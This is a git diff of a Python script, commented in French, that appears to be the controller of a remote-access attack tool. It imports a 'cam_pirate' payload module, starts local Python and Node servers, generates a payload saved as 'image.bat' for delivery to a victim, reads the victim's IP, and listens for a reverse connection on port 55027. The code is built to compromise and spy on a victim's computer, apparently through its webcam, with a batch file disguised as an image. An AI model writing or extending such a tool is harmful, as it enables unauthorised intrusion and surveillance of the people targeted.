@@ -8,7 +8,7 @@ TODO: réorganiser le code
 
 
 # importation des modules
-import socket, sys,time,os,threading,csv
+import socket, sys,time,os,subprocess
 import payload.cam_pirate as cam
 from colorama import Fore,deinit,init
 from modules.fonctions import get_self_ip, generation_vecteur, menu, save_ip, read_victime_ip
@@ -25,13 +25,19 @@ choix :str = menu()
 
 
 if choix=="1":
-    try:
-        os.system("start /Min servers/server.py")
-        os.system("start /Min node servers/server.js")
-        print("server ok")
-    except:
-        print("error server")
-        sys.exit()
+    # try:
+    server_python = subprocess.Popen(["python", "servers/server.py"], creationflags=subprocess.CREATE_NEW_CONSOLE)
+    #os.system("start /Min servers/server.py")
+    server_js_path = os.path.abspath("servers/server.js")
+    NODE_PATH = r"C:\Program Files\nodejs\node.exe"
+    print(server_js_path)
+    server_js = subprocess.Popen([NODE_PATH, server_js_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    #os.system("start /Min node servers/server.js")
+    print("server ok")
+    # except:1
+    #     print("error server")
+    #     sys.exit()
     print("generation du payload...")
     generation_vecteur(HOST)
     print("payload enregistré sous le nom image.bat")
@@ -42,10 +48,17 @@ if choix=="1":
 len_msg = 4096
 
 print("démarage de l'ecoute")
+ip_victime = read_victime_ip()
+
+try:
+    server_python.terminate()
+    server_js.terminate()
+except:
+    pass
+
+PORT = 55027
 mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # mySocket.settimeout(5)
-PORT = 55027
-ip_victime = read_victime_ip()
 print("Resverse lisening on ",ip_victime,"port ",PORT)
 while True:
     try:
